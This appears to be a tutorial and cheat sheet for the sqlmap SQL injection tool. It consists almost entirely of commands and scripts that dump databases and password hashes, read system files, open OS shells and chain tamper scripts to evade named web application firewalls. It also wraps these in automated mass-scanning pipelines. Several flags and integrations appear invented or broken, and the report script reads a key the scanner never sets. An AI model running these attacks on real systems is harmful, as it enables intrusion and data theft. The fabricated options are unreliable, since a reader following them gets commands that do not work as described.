# 🔍 SQLMAP AUTOMATED SQL INJECTION TESTING | COMPREHENSIVE PENETRATION TESTING FRAMEWORK

## Complete SQL Injection Assessment Methodology

### 1 SQLMap Fundamentals & Core Concepts
- **SQL Injection Techniques:**
  - Boolean-based blind SQL injection
  - Time-based blind SQL injection  
  - Error-based SQL injection
  - UNION query SQL injection
  - Stacked queries SQL injection
  - Out-of-band SQL injection
  - Heavy query-based detection

- **Database Management Systems:**
  - MySQL comprehensive testing
  - PostgreSQL advanced assessment
  - Microsoft SQL Server testing
  - Oracle Database exploitation
  - SQLite vulnerability assessment
  - Microsoft Access testing
  - IBM DB2 assessment
  - Sybase ASE testing
  - SAP MaxDB evaluation
  - Informix database testing

### 2 Basic SQLMap Usage & Syntax
```bash
# Fundamental SQLMap Commands
# Basic URL testing
sqlmap -u "http://example.com/page.php?id=1"

# POST request testing
sqlmap -u "http://example.com/login" --data="username=admin&password=pass"

# Cookie-based authentication testing
sqlmap -u "http://example.com/dashboard" --cookie="session=abc123"

# HTTP header injection testing
sqlmap -u "http://example.com/" --headers="X-Forwarded-For: 127.0.0.1"

# Custom HTTP method testing
sqlmap -u "http://example.com/api" --method=PUT --data='{"id":1}'
```

### 3 Advanced Target Specification
```bash
# Request file usage for complex scenarios
sqlmap -r request.txt

# Multiple parameter testing
sqlmap -u "http://example.com/search?q=test&category=1" -p "q,category"

# Excluding specific parameters
sqlmap -u "http://example.com/page?q=test&category=1" --skip="category"

# Custom parameter delimiter
sqlmap -u "http://example.com/page" --param-del=";"

# JSON data injection
sqlmap -u "http://example.com/api" --data='{"user":"test","id":1}' --json-param="user,id"
```

### 4 Comprehensive Enumeration Techniques
```bash
# Database Information Enumeration
sqlmap -u "http://example.com?id=1" --current-user --current-db --hostname

# Database Structure Discovery
sqlmap -u "http://example.com?id=1" --dbs
sqlmap -u "http://example.com?id=1" -D database_name --tables
sqlmap -u "http://example.com?id=1" -D database_name -T table_name --columns
sqlmap -u "http://example.com?id=1" -D database_name -T table_name -C "username,password" --dump

# Advanced Schema Enumeration
sqlmap -u "http://example.com?id=1" --schema
sqlmap -u "http://example.com?id=1" --count
sqlmap -u "http://example.com?id=1" --exclude-sysdbs

# User and Privilege Enumeration
sqlmap -u "http://example.com?id=1" --users
sqlmap -u "http://example.com?id=1" --passwords
sqlmap -u "http://example.com?id=1" --privileges
sqlmap -u "http://example.com?id=1" --roles
```

### 5 Advanced Exploitation Methods
```bash
# File System Operations
sqlmap -u "http://example.com?id=1" --file-read="/etc/passwd"
sqlmap -u "http://example.com?id=1" --file-write="/local/file.txt" --file-dest="/remote/path/file.txt"

# Operating System Command Execution
sqlmap -u "http://example.com?id=1" --os-cmd="whoami"
sqlmap -u "http://example.com?id=1" --os-shell
sqlmap -u "http://example.com?id=1" --os-pwn
sqlmap -u "http://example.com?id=1" --os-smbrelay

# Database Server Operations
sqlmap -u "http://example.com?id=1" --sql-query="SELECT * FROM users"
sqlmap -u "http://example.com?id=1" --sql-shell
sqlmap -u "http://example.com?id=1" --sql-file="/path/to/query.sql"
```

### 6 Bypassing Security Mechanisms
```bash
# WAF/IPS Evasion Techniques
sqlmap -u "http://example.com?id=1" --tamper="space2comment"
sqlmap -u "http://example.com?id=1" --tamper="between,charencode"
sqlmap -u "http://example.com?id=1" --tamper="randomcase"
sqlmap -u "http://example.com?id=1" --tamper="charunicodeencode"

# Multiple tamper scripts combination
sqlmap -u "http://example.com?id=1" --tamper="space2comment,charencode,randomcase"

# Advanced evasion techniques
sqlmap -u "http://example.com?id=1" --random-agent
sqlmap -u "http://example.com?id=1" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://example.com?id=1" --delay=2
sqlmap -u "http://example.com?id=1" --timeout=30
sqlmap -u "http://example.com?id=1" --retries=3
sqlmap -u "http://example.com?id=1" --skip-waf
```

### 7 Performance & Optimization
```bash
# Performance Optimization Flags
sqlmap -u "http://example.com?id=1" --threads=10
sqlmap -u "http://example.com?id=1" --predict-output
sqlmap -u "http://example.com?id=1" --keep-alive
sqlmap -u "http://example.com?id=1" --null-connection
sqlmap -u "http://example.com?id=1" --text-only

# Risk and Level Configuration
sqlmap -u "http://example.com?id=1" --level=3
sqlmap -u "http://example.com?id=1" --risk=3

# Batch mode for automated testing
sqlmap -u "http://example.com?id=1" --batch

# Force specific DBMS
sqlmap -u "http://example.com?id=1" --dbms=mysql
```

### 8 Advanced Scanning Techniques
```bash
# Crawling and Form Testing
sqlmap -u "http://example.com" --crawl=2
sqlmap -u "http://example.com" --forms
sqlmap -u "http://example.com" --crawl=3 --forms --batch

# Google Dork Integration
sqlmap -g "inurl:\".php?id=1\" site:example.com"

# Multiple Target Scanning
sqlmap -m targets.txt
sqlmap -l burp_log.txt

# Custom Injection Points
sqlmap -u "http://example.com/page" --param="search:query"
sqlmap -u "http://example.com/page" --param="cookie:session"
```

### 9 Comprehensive Tamper Scripts
```python
# Custom Tamper Script Example: advanced_charencode.py
#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Advanced URL encoding for WAF bypass
    """
    retVal = payload
    
    if payload:
        # URL encode all characters
        retVal = ""
        i = 0
        while i < len(payload):
            if re.match(r'[A-Za-z0-9]', payload[i]):
                retVal += payload[i]
            else:
                retVal += "%%%02X" % ord(payload[i])
            i += 1

    return retVal

# Additional Custom Tamper Script: json_escape.py
def tamper(payload, **kwargs):
    """
    Escape payload for JSON injection points
    """
    if payload:
        payload = payload.replace('"', '\\"')
        payload = payload.replace("'", "\\'")
        payload = payload.replace("\\", "\\\\")
        payload = payload.replace("\n", "\\n")
        payload = payload.replace("\r", "\\r")
        payload = payload.replace("\t", "\\t")
    
    return payload
```

### 10 Database-Specific Exploitation
```bash
# MySQL Specific Exploitation
sqlmap -u "http://example.com?id=1" --dbms=mysql --technique=B --union-cols=10

# PostgreSQL Specific Exploitation
sqlmap -u "http://example.com?id=1" --dbms=postgresql --technique=U

# Microsoft SQL Server Exploitation
sqlmap -u "http://example.com?id=1" --dbms=mssql --os-cmd="ipconfig"

# Oracle Database Exploitation
sqlmap -u "http://example.com?id=1" --dbms=oracle --technique=T

# SQLite Exploitation
sqlmap -u "http://example.com?id=1" --dbms=sqlite --file-read="/etc/passwd"
```

### 11 Advanced Authentication & Session Management
```bash
# HTTP Authentication
sqlmap -u "http://example.com/admin" --auth-type=BASIC --auth-cred="admin:password"

# NTLM Authentication
sqlmap -u "http://example.com/admin" --auth-type=NTLM --auth-cred="DOMAIN\user:password"

# Cookie-based Session Management
sqlmap -u "http://example.com/dashboard" --cookie="session=abc123; user=admin" --load-cookies="/path/to/cookies.txt"

# CSRF Token Handling
sqlmap -u "http://example.com/form" --csrf-token="csrf_token" --csrf-url="http://example.com/get_token"

# JWT Token Testing
sqlmap -u "http://example.com/api" --headers="Authorization: Bearer eyJ0eXAi..." --prefix="'"
```

### 12 Comprehensive Assessment Workflow
```bash
#!/bin/bash
# comprehensive_sql_injection_scan.sh

TARGET_URL="$1"
OUTPUT_DIR="sqlmap_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting Comprehensive SQL Injection Assessment for: $TARGET_URL"
echo "[*] Output Directory: $OUTPUT_DIR"

# Phase 1: Initial Detection
echo "[+] Phase 1: Initial Detection"
sqlmap -u "$TARGET_URL" --batch --level=1 --risk=1 --flush-session --output-dir="$OUTPUT_DIR/phase1"

# Phase 2: Advanced Detection
echo "[+] Phase 2: Advanced Detection"
sqlmap -u "$TARGET_URL" --batch --level=3 --risk=2 --technique=BEUSTQ --output-dir="$OUTPUT_DIR/phase2"

# Phase 3: WAF Evasion
echo "[+] Phase 3: WAF Evasion Testing"
sqlmap -u "$TARGET_URL" --batch --level=5 --risk=3 --tamper="space2comment,charencode,randomcase" --output-dir="$OUTPUT_DIR/phase3"

# Phase 4: Database Enumeration
echo "[+] Phase 4: Database Enumeration"
sqlmap -u "$TARGET_URL" --batch --current-user --current-db --hostname --dbs --output-dir="$OUTPUT_DIR/phase4"

# Phase 5: Data Extraction
echo "[+] Phase 5: Data Extraction"
sqlmap -u "$TARGET_URL" --batch --schema --count --exclude-sysdbs --output-dir="$OUTPUT_DIR/phase5"

# Phase 6: Privilege Escalation
echo "[+] Phase 6: Privilege Escalation Testing"
sqlmap -u "$TARGET_URL" --batch --privileges --users --passwords --roles --output-dir="$OUTPUT_DIR/phase6"

# Generate Report
echo "[+] Generating Final Report"
cat "$OUTPUT_DIR"/phase*/*.log > "$OUTPUT_DIR/comprehensive_scan.log"
echo "[*] Assessment Complete. Results in: $OUTPUT_DIR"
```

### 13 Integration with Other Tools
```bash
# Burp Suite Integration
sqlmap -u "http://example.com" --proxy="http://127.0.0.1:8080"

# OWASP ZAP Integration
sqlmap -u "http://example.com" --proxy="http://127.0.0.1:8080" --tamper="base64encode"

# Nikto Integration
nikto -h example.com -o nikto_scan.txt
sqlmap -l nikto_scan.txt --batch

# Nmap Integration
nmap -p 80 --script http-sql-injection example.com -oN nmap_scan.txt
sqlmap -g "inurl:example.com" --batch

# Custom Script Integration
#!/bin/bash
# automated_sqli_pipeline.sh

# Discover endpoints
echo "[*] Discovering endpoints..."
gau example.com | grep "\.php" | tee endpoints.txt

# Test each endpoint
echo "[*] Testing endpoints for SQL injection..."
while read -r url; do
    echo "[+] Testing: $url"
    sqlmap -u "$url" --batch --level=2 --risk=2 --output-dir="scan_$(echo $url | md5sum | cut -d' ' -f1)"
done < endpoints.txt
```

### 14 Advanced Configuration Files
```ini
# sqlmap.conf - Advanced Configuration File
[Target]
url = http://example.com/page.php?id=1
data = username=admin&password=test
cookie = session=abc123
random-agent = 1
proxy = http://127.0.0.1:8080

[Request]
delay = 1
timeout = 30
retries = 3
threads = 10
level = 3
risk = 2

[Techniques]
technique = BEUSTQ
union-cols = 10
union-char = 123

[Detection]
dbms = mysql
os = Linux
tamper = space2comment,charencode

[Enumeration]
current-user = 1
current-db = 1
dbs = 1
tables = 1
columns = 1
dump = 1

[Optimization]
predict-output = 1
keep-alive = 1
null-connection = 1
```

### 15 Custom Payload Development
```python
# custom_payloads.xml - Advanced Payload Definitions
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <!-- Boolean-based blind payloads -->
    <test>
        <title>MySQL Boolean-based blind - Custom</title>
        <stype>1</stype>
        <level>3</level>
        <risk>2</risk>
        <clause>1,2,3,9</clause>
        <where>1</where>
        <vector>AND [RANDNUM]=[RANDNUM]</vector>
        <request>
            <payload>AND [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND [RANDNUM]=[RANDNUM1]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <!-- Time-based blind payloads -->
    <test>
        <title>MySQL Time-based blind - Custom SLEEP</title>
        <stype>2</stype>
        <level>4</level>
        <risk>3</risk>
        <clause>1,2,3,9</clause>
        <where>1</where>
        <vector>SLEEP([SLEEPTIME])</vector>
        <request>
            <payload>SLEEP([SLEEPTIME])</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <!-- UNION-based payloads -->
    <test>
        <title>MySQL UNION query - Custom columns</title>
        <stype>3</stype>
        <level>3</level>
        <risk>2</risk>
        <clause>1,2,3</clause>
        <where>1</where>
        <vector>UNION ALL SELECT [COLUMNS]</vector>
        <request>
            <payload>UNION ALL SELECT [COLUMNS]</payload>
        </request>
        <response>
            <union>1,2,3,4,5,6,7,8,9,10</union>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>
</root>
```

### 16 Web Application Firewall Bypass
```bash
# Comprehensive WAF Bypass Techniques
sqlmap -u "http://example.com?id=1" --tamper="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"

# CloudFlare Bypass
sqlmap -u "http://example.com?id=1" --tamper="between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes" --random-agent --delay=5

# ModSecurity Bypass
sqlmap -u "http://example.com?id=1" --tamper="space2comment,charencode,randomcase,charunicodeencode" --hex --no-cast

# Imperva Bypass
sqlmap -u "http://example.com?id=1" --tamper="equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes" --prefix="')((" --suffix="))-- -"

# Custom Bypass Chain
sqlmap -u "http://example.com?id=1" --tamper="xforwardedfor.py,randomuseragent.py,urlencode.py" --skip-waf
```

### 17 API & RESTful Endpoint Testing
```bash
# JSON Endpoint Testing
sqlmap -u "http://api.example.com/users" --data='{"id":1}' --method=POST --headers="Content-Type: application/json" --json-param="id"

# XML Endpoint Testing
sqlmap -u "http://api.example.com/soap" --data='<?xml version="1.0"?><user><id>1</id></user>' --method=POST --headers="Content-Type: text/xml" --param="id"

# GraphQL Endpoint Testing
sqlmap -u "http://api.example.com/graphql" --data='{"query":"query { user(id: 1) { name } }"}' --method=POST --headers="Content-Type: application/json" --param="query"

# RESTful API Parameter Testing
sqlmap -u "http://api.example.com/users/1" --method=GET
sqlmap -u "http://api.example.com/users/1" --method=PUT --data='{"name":"test"}'
sqlmap -u "http://api.example.com/users/1" --method=DELETE
```

### 18 Advanced Reporting & Analysis
```bash
# Comprehensive Reporting Formats
sqlmap -u "http://example.com?id=1" --batch --output-dir=scan_results

# Generate Multiple Report Formats
sqlmap -u "http://example.com?id=1" --batch -o --dump-all --output-dir=reports

# CSV Output for Data Analysis
sqlmap -u "http://example.com?id=1" --batch --dump -D database_name -T table_name --output-dir=csv_output --csv-del=";"

# HTML Report Generation
sqlmap -u "http://example.com?id=1" --batch --output-dir=html_report --format=html

# JSON Output for Automation
sqlmap -u "http://example.com?id=1" --batch --output-dir=json_output --format=json

# Parse and Analyze Results
#!/bin/bash
# analyze_sqlmap_results.sh

for file in $(find . -name "*.log"); do
    echo "Analyzing: $file"
    
    # Extract vulnerable URLs
    grep -h "target url" "$file" | cut -d':' -f2- | sed 's/^ *//'
    
    # Extract database information
    grep -h "current user\|current database\|hostname" "$file"
    
    # Extract extracted data count
    echo "Records extracted: $(grep -h "extracted.*data" "$file" | wc -l)"
    
    echo "---"
done
```

### 19 Enterprise Deployment & Automation
```python
#!/usr/bin/env python3
# enterprise_sqlmap_scanner.py

import subprocess
import json
import time
import logging
from datetime import datetime
import os

class EnterpriseSQLMapScanner:
    def __init__(self, config_file="config.json"):
        self.config = self.load_config(config_file)
        self.setup_logging()
        
    def load_config(self, config_file):
        """Load configuration from JSON file"""
        with open(config_file, 'r') as f:
            return json.load(f)
    
    def setup_logging(self):
        """Setup comprehensive logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('sqlmap_enterprise.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def scan_target(self, target):
        """Perform comprehensive SQL injection scan"""
        output_dir = f"scans/{target['name']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(output_dir, exist_ok=True)
        
        cmd = [
            "sqlmap",
            "-u", target["url"],
            "--batch",
            "--level", str(target.get("level", 3)),
            "--risk", str(target.get("risk", 2)),
            "--output-dir", output_dir,
            "--flush-session"
        ]
        
        # Add additional options based on configuration
        if target.get("crawl"):
            cmd.extend(["--crawl", str(target["crawl"])])
        
        if target.get("forms"):
            cmd.append("--forms")
        
        if target.get("tamper"):
            cmd.extend(["--tamper", target["tamper"]])
        
        if target.get("proxy"):
            cmd.extend(["--proxy", target["proxy"]])
        
        self.logger.info(f"Starting scan for {target['name']}")
        start_time = time.time()
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=target.get("timeout", 3600))
            
            # Log results
            with open(f"{output_dir}/execution.log", "w") as f:
                f.write(result.stdout)
                f.write(result.stderr)
            
            scan_time = time.time() - start_time
            self.logger.info(f"Completed scan for {target['name']} in {scan_time:.2f} seconds")
            
            return {
                "target": target["name"],
                "success": result.returncode == 0,
                "output_dir": output_dir,
                "scan_time": scan_time,
                "vulnerabilities_found": self.analyze_results(output_dir)
            }
            
        except subprocess.TimeoutExpired:
            self.logger.error(f"Scan for {target['name']} timed out")
            return {"target": target["name"], "success": False, "error": "Timeout"}
    
    def analyze_results(self, output_dir):
        """Analyze scan results for vulnerabilities"""
        vulnerabilities = []
        
        # Parse log files for vulnerabilities
        log_file = f"{output_dir}/log"
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                content = f.read()
                if "sql injection" in content.lower():
                    vulnerabilities.append("SQL Injection")
                if "database management system" in content.lower():
                    vulnerabilities.append("Database Disclosure")
        
        return vulnerabilities
    
    def generate_report(self, scan_results):
        """Generate comprehensive scan report"""
        report = {
            "scan_date": datetime.now().isoformat(),
            "total_targets": len(scan_results),
            "successful_scans": len([r for r in scan_results if r["success"]]),
            "vulnerabilities_found": sum(len(r.get("vulnerabilities", [])) for r in scan_results),
            "detailed_results": scan_results
        }
        
        with open("enterprise_scan_report.json", "w") as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Report generated: {report}")

# Configuration File (config.json)
"""
{
  "targets": [
    {
      "name": "Web Application 1",
      "url": "http://app1.example.com/page.php?id=1",
      "level": 3,
      "risk": 2,
      "crawl": 2,
      "forms": true,
      "tamper": "space2comment,charencode",
      "timeout": 1800
    },
    {
      "name": "API Endpoint",
      "url": "http://api.example.com/users/1",
      "level": 2,
      "risk": 1,
      "timeout": 900
    }
  ],
  "global_settings": {
    "proxy": "http://corporate-proxy:8080",
    "random_agent": true,
    "delay": 1
  }
}
"""
```

### 20 Compliance & Best Practices
```bash
# Safe Testing Practices
sqlmap -u "http://example.com" --batch --skip-heuristic --safe-url="http://example.com/safe" --safe-freq=1

# Legal and Ethical Testing
sqlmap -u "http://example.com" --batch --test-filter="NOT (LGPL OR GPL)"

# Performance-Optimized Scanning
sqlmap -u "http://example.com" --batch --optimize --o --predict-output --keep-alive --null-connection

# Resource Management
sqlmap -u "http://example.com" --batch --max-requests=1000 --max-memory=1024 --max-time=3600

# Compliance Scanning
sqlmap -u "http://example.com" --batch --check-waf --identify-waf --mobile --smart

# Cleanup and Maintenance
sqlmap --purge
sqlmap --flush-session
sqlmap --update
```

This comprehensive SQLMap framework provides security professionals with a complete methodology for SQL injection testing, from basic detection to advanced enterprise-level exploitation. The framework covers all aspects of SQL injection assessment including WAF evasion, database-specific exploitation, automation, and compliance testing.